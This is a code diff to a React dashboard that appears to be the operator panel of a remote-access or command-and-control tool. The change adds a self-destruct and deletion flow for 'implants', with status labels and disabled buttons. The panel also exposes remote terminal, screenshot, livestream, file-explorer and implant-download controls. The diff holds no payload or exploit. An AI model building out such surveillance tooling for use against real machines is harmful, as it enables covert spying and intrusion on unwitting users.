@@ -81,6 +81,23 @@ function DeleteConfirmationModal({ isOpen, onClose, onConfirm, implantToken }) {
           Are you sure you want to delete implant <strong className="font-mono">{implantToken}</strong>?
           This action cannot be undone.
         </p>
+        <div className="bg-amber-50 border border-amber-200 rounded-md p-3 mb-4">
+          <div className="flex">
+            <div className="flex-shrink-0">
+              <svg className="h-5 w-5 text-amber-400" viewBox="0 0 20 20" fill="currentColor">
+                <path fillRule="evenodd" d="M8.257 3.099c.765-1.36 2.722-1.36 3.486 0l5.58 9.92c.75 1.334-.213 2.98-1.742 2.98H4.42c-1.53 0-2.493-1.646-1.743-2.98l5.58-9.92zM11 13a1 1 0 11-2 0 1 1 0 012 0zm-1-8a1 1 0 00-1 1v3a1 1 0 002 0V6a1 1 0 00-1-1z" clipRule="evenodd" />
+              </svg>
+            </div>
+            <div className="ml-3">
+              <h3 className="text-sm font-medium text-amber-800">
+                Deletion Process
+              </h3>
+              <div className="mt-2 text-sm text-amber-700">
+                <p>If the implant is online, it will receive a self-destruct command. The server will then wait 5 seconds before removing it from the database. During this time, all actions will be disabled and you'll see a loading indicator.</p>
+              </div>
+            </div>
+          </div>
+        </div>
         <div className="flex justify-end space-x-3">
           <button
             onClick={onClose}
@@ -146,6 +163,10 @@ function Dashboard() {
   implantId: null,
 });
 
+  // Track implants that are pending deletion (have received self-destruct command)
+  const [pendingDeletionImplants, setPendingDeletionImplants] = useState(new Set());
+  const [deletingImplants, setDeletingImplants] = useState(new Set()); // Track implants currently being deleted
+
 
 const openFileExplorer = (implantToken) => {
   setFileExplorerState({ isOpen: true, implantId: implantToken });
@@ -202,7 +223,19 @@ const closeFileExplorer = () => {
         return;
       }
       const data = await res.json();
-      setImplants(data.implants || []);
+      const fetchedImplants = data.implants || [];
+      setImplants(fetchedImplants);
+      
+      // Clean up pending deletion state for implants that no longer exist
+      const currentImplantTokens = new Set(fetchedImplants.map(imp => imp.unique_token));
+      setPendingDeletionImplants(prev => {
+        const filtered = new Set([...prev].filter(token => currentImplantTokens.has(token)));
+        return filtered.size !== prev.size ? filtered : prev;
+      });
+      setDeletingImplants(prev => {
+        const filtered = new Set([...prev].filter(token => currentImplantTokens.has(token)));
+        return filtered.size !== prev.size ? filtered : prev;
+      });
     } catch (err) {
       console.error("Network error fetching implants:", err);
       
@@ -241,6 +274,21 @@ const closeFileExplorer = () => {
 
   const handleDeleteConfirmed = async () => {
     if (!implantToDelete) return;
+    
+    // Check if implant is online and mark it as pending deletion
+    const implant = implants.find(imp => imp.unique_token === implantToDelete);
+    const isOnline = implant?.status?.toLowerCase() === "online";
+    
+    // Mark as currently being deleted (for loading state)
+    setDeletingImplants(prev => new Set([...prev, implantToDelete]));
+    
+    if (isOnline) {
+      setPendingDeletionImplants(prev => new Set([...prev, implantToDelete]));
+      displayNotification("Self-destruct command sent. Deletion in progress...", "info", 8000);
+    } else {
+      displayNotification("Deleting implant...", "info", 3000);
+    }
+    
     const token = localStorage.getItem("token");
     try {
       const res = await fetch(`${API_BASE}/implants/${implantToDelete}`, {
@@ -248,17 +296,56 @@ const closeFileExplorer = () => {
         headers: { Authorization: `Bearer ${token}` },
       });
       if (res.ok) {
-        displayNotification("Implant deleted successfully.", "success");
+        if (isOnline) {
+          displayNotification("Implant successfully deleted from database after 5-second delay.", "success");
+        } else {
+          displayNotification("Implant deleted successfully.", "success");  
+        }
+        
+        // Remove from both pending deletion and deleting sets when actually deleted
+        setPendingDeletionImplants(prev => {
+          const newSet = new Set(prev);
+          newSet.delete(implantToDelete);
+          return newSet;
+        });
+        setDeletingImplants(prev => {
+          const newSet = new Set(prev);
+          newSet.delete(implantToDelete);
+          return newSet;
+        });
+        
         fetchImplants(); 
         if (selectedImplantForTerminal === implantToDelete) setSelectedImplantForTerminal(null);
         if (screenshotViewerState.implantId === implantToDelete) closeScreenshotViewer(); 
       } else {
         const data = await res.json().catch(() => ({}));
         displayNotification(`Failed to delete implant: ${data.error || res.statusText}`, "error");
+        // Remove from both sets if it failed
+        setPendingDeletionImplants(prev => {
+          const newSet = new Set(prev);
+          newSet.delete(implantToDelete);
+          return newSet;
+        });
+        setDeletingImplants(prev => {
+          const newSet = new Set(prev);
+          newSet.delete(implantToDelete);
+          return newSet;
+        });
       }
     } catch (err) {
       displayNotification("Error deleting implant. Check console.", "error");
       console.error("Delete implant error:", err);
+      // Remove from both sets if it failed
+      setPendingDeletionImplants(prev => {
+        const newSet = new Set(prev);
+        newSet.delete(implantToDelete);
+        return newSet;
+      });
+      setDeletingImplants(prev => {
+        const newSet = new Set(prev);
+        newSet.delete(implantToDelete);
+        return newSet;
+      });
     } finally {
       closeDeleteConfirmation();
       setImplantToDelete(null);
@@ -343,13 +430,26 @@ const closeFileExplorer = () => {
   const handleOpenTerminal = (uniqueToken) => setSelectedImplantForTerminal(uniqueToken);
   const handleCloseTerminal = () => setSelectedImplantForTerminal(null);
 
-  const getStatusColor = (status) => {
+  const getStatusColor = (status, isPendingDeletion = false) => {
+    if (isPendingDeletion) {
+      return 'bg-orange-100 text-orange-800 border border-orange-300';
+    }
     switch (status?.toLowerCase()) {
       case 'online': return 'bg-green-100 text-green-800';
       case 'offline': return 'bg-red-100 text-red-800';
       case 'new': return 'bg-blue-100 text-blue-800';
       default: return 'bg-gray-100 text-gray-800';
     }
+  };
+
+  const getStatusText = (status, isPendingDeletion = false, isDeleting = false) => {
+    if (isDeleting) {
+      return 'Deleting...';
+    }
+    if (isPendingDeletion) {
+      return status?.toLowerCase() === 'online' ? 'Pending Deletion' : 'Deleting...';
+    }
+    return status || "N/A";
   };
 
   
@@ -635,16 +735,40 @@ const closeFileExplorer = () => {
                   </tr>
                 </thead>
                 <tbody className="bg-white divide-y divide-gray-200">
-                  {implants.map((implant, index) => (
+                  {implants.map((implant, index) => {
+                    const isPendingDeletion = pendingDeletionImplants.has(implant.unique_token);
+                    const isDeleting = deletingImplants.has(implant.unique_token);
+                    const isDisabled = isPendingDeletion || isDeleting;
+                    return (
                     <tr
                       key={implant.unique_token}
-                      className="hover:bg-gray-50 transition-colors"
+                      className={`transition-colors ${isDisabled ? 'bg-orange-50 hover:bg-orange-100' : 'hover:bg-gray-50'}`}
                     >
                       <td className="p-3 text-sm text-gray-700 whitespace-nowrap">
                         {index + 1}
                       </td>
                       <td className="p-3 text-sm text-gray-700 font-mono whitespace-nowrap">
                         {implant.unique_token}
+                        {isDisabled && (
+                          <div className="flex items-center mt-1">
+                            {isDeleting ? (
+                              <>
+                                <svg className="w-4 h-4 text-orange-500 mr-1 animate-spin" fill="none" viewBox="0 0 24 24">
+                                  <circle className="opacity-25" cx="12" cy="12" r="10" stroke="currentColor" strokeWidth="4"></circle>
+                                  <path className="opacity-75" fill="currentColor" d="m4 12a8 8 0 018-8V0C5.373 0 0 5.373 0 12h4zm2 5.291A7.962 7.962 0 014 12H0c0 3.042 1.135 5.824 3 7.938l3-2.647z"></path>
+                                </svg>
+                                <span className="text-xs text-orange-600 font-medium">Deleting...</span>
+                              </>
+                            ) : (
+                              <>
+                                <svg className="w-4 h-4 text-orange-500 mr-1" fill="none" stroke="currentColor" viewBox="0 0 24 24">
+                                  <path strokeLinecap="round" strokeLinejoin="round" strokeWidth={2} d="M12 9v2m0 4h.01m-6.938 4h13.856c1.54 0 2.502-1.667 1.732-2.5L13.732 4c-.77-.833-1.964-.833-2.732 0L3.732 16.5c-.77.833.192 2.5 1.732 2.5z" />
+                                </svg>
+                                <span className="text-xs text-orange-600 font-medium">Will be deleted</span>
+                              </>
+                            )}
+                          </div>
+                        )}
                       </td>
                       <td className="p-3 text-sm text-gray-700 whitespace-nowrap capitalize">
                         {implant.target_os || "N/A"}
@@ -652,10 +776,10 @@ const closeFileExplorer = () => {
                       <td className="p-3 text-sm text-gray-700 whitespace-nowrap">
                         <span
                           className={`px-2.5 py-0.5 inline-flex text-xs leading-5 font-semibold rounded-full ${getStatusColor(
-                            implant.status
+                            implant.status, isPendingDeletion
                           )}`}
                         >
-                          {implant.status || "N/A"}
+                          {getStatusText(implant.status, isPendingDeletion, isDeleting)}
                         </span>
                       </td>
                       <td className="p-3 text-sm text-gray-700 whitespace-nowrap">
@@ -670,66 +794,105 @@ const closeFileExplorer = () => {
                       <td className="p-3 text-sm text-gray-700 whitespace-nowrap text-center">
                         <div className="flex flex-wrap justify-center items-center gap-1">
                           <button
-                            className="bg-sky-500 text-white px-3 py-1.5 rounded-md hover:bg-sky-600 transition-colors text-xs font-medium"
+                            className={`px-3 py-1.5 rounded-md transition-colors text-xs font-medium ${
+                              isDisabled 
+                                ? 'bg-gray-400 text-gray-200 cursor-not-allowed' 
+                                : 'bg-sky-500 text-white hover:bg-sky-600'
+                            }`}
                             onClick={() =>
-                              handleOpenTerminal(implant.unique_token)
+                              !isDisabled && handleOpenTerminal(implant.unique_token)
                             }
-                            title="Open terminal"
+                            disabled={isDisabled}
+                            title={isDisabled ? "Implant is being deleted" : "Open terminal"}
                           >
                             Terminal
                           </button>
                           <button
-                            className="bg-teal-500 text-white px-3 py-1.5 rounded-md hover:bg-teal-600 transition-colors text-xs font-medium"
+                            className={`px-3 py-1.5 rounded-md transition-colors text-xs font-medium ${
+                              isDisabled 
+                                ? 'bg-gray-400 text-gray-200 cursor-not-allowed' 
+                                : 'bg-teal-500 text-white hover:bg-teal-600'
+                            }`}
                             onClick={() =>
-                              handleViewScreenshotsButton(implant.unique_token)
+                              !isDisabled && handleViewScreenshotsButton(implant.unique_token)
                             }
-                            title="View all screenshots for this implant"
+                            disabled={isDisabled}
+                            title={isDisabled ? "Implant is being deleted" : "View all screenshots for this implant"}
                           >
                             Screenshots
                           </button>
 
                           <button
-                            className="bg-purple-500 text-white px-3 py-1.5 rounded-md hover:bg-purple-600 transition-colors text-xs font-medium"
+                            className={`px-3 py-1.5 rounded-md transition-colors text-xs font-medium ${
+                              isDisabled 
+                                ? 'bg-gray-400 text-gray-200 cursor-not-allowed' 
+                                : 'bg-purple-500 text-white hover:bg-purple-600'
+                            }`}
                             onClick={() =>
-                              handleStartStreamButton(implant.unique_token)
+                              !isDisabled && handleStartStreamButton(implant.unique_token)
                             }
-                            title="Start Livestream Feed and Open Viewer"
+                            disabled={isDisabled}
+                            title={isDisabled ? "Implant is being deleted" : "Start Livestream Feed and Open Viewer"}
                           >
                             Start Stream
                           </button>
 
                           <button
-                            className="bg-cyan-600 text-white px-3 py-1.5 rounded-md hover:bg-cyan-700 transition-colors text-xs font-medium"
+                            className={`px-3 py-1.5 rounded-md transition-colors text-xs font-medium ${
+                              isDisabled 
+                                ? 'bg-gray-400 text-gray-200 cursor-not-allowed' 
+                                : 'bg-cyan-600 text-white hover:bg-cyan-700'
+                            }`}
                             onClick={() =>
-                              openFileExplorer(implant.unique_token)
+                              !isDisabled && openFileExplorer(implant.unique_token)
                             }
-                            title="Open File Explorer"
+                            disabled={isDisabled}
+                            title={isDisabled ? "Implant is being deleted" : "Open File Explorer"}
                           >
                             File Explorer
                           </button>
 
                           <button
-                            className="bg-yellow-500 text-white px-3 py-1.5 rounded-md hover:bg-yellow-600 transition-colors text-xs font-medium"
+                            className={`px-3 py-1.5 rounded-md transition-colors text-xs font-medium ${
+                              isDisabled 
+                                ? 'bg-gray-400 text-gray-200 cursor-not-allowed' 
+                                : 'bg-yellow-500 text-white hover:bg-yellow-600'
+                            }`}
                             onClick={() =>
-                              openDownloadOptionsModal(implant.unique_token)
+                              !isDisabled && openDownloadOptionsModal(implant.unique_token)
                             }
-                            title="Download implant"
+                            disabled={isDisabled}
+                            title={isDisabled ? "Implant is being deleted" : "Download implant"}
                           >
                             Download
                           </button>
                           <button
-                            className="bg-red-600 text-white px-3 py-1.5 rounded-md hover:bg-red-700 transition-colors text-xs font-medium"
+                            className={`px-3 py-1.5 rounded-md transition-colors text-xs font-medium ${
+                              isDisabled 
+                                ? 'bg-gray-400 text-gray-200 cursor-not-allowed' 
+                                : 'bg-red-600 text-white hover:bg-red-700'
+                            }`}
                             onClick={() =>
-                              openDeleteConfirmation(implant.unique_token)
+                              !isDisabled && openDeleteConfirmation(implant.unique_token)
                             }
-                            title="Delete implant"
+                            disabled={isDisabled}
+                            title={isDisabled ? "Implant is already being deleted" : "Delete implant"}
                           >
-                            Delete
+                            {isDeleting ? (
+                              <>
+                                <svg className="w-4 h-4 animate-spin mr-1" fill="none" viewBox="0 0 24 24">
+                                  <circle className="opacity-25" cx="12" cy="12" r="10" stroke="currentColor" strokeWidth="4"></circle>
+                                  <path className="opacity-75" fill="currentColor" d="m4 12a8 8 0 018-8V0C5.373 0 0 5.373 0 12h4zm2 5.291A7.962 7.962 0 014 12H0c0 3.042 1.135 5.824 3 7.938l3-2.647z"></path>
+                                </svg>
+                                Deleting...
+                              </>
+                            ) : isPendingDeletion ? 'Pending' : 'Delete'}
                           </button>
                         </div>
                       </td>
                     </tr>
-                  ))}
+                    );
+                  })}
                 </tbody>
               </table>
             </div>
